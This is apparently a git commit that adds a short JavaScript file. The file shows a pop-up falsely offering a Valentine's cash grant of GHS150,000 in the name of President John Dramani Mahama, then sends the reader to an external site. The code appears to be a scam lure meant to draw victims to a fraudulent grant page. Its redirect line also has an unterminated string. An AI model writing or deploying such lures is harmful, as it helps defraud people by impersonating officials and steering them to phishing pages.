34e2548892ab8e7e7cc32a65c073ba2931ffeaee
Sweetblogboi <nsiboy760@gmail.com>
2025-02-12 12:45:25 +0100

    Create ghana-active.js

---
+++ ghana-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify for President JOHN DRAMANI MAHAMA GHS150,000 VALENTINES CASH GRANT, Kindly Press OK to get gift now   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://realgrant-2025.org/ghana-val.html;
+}
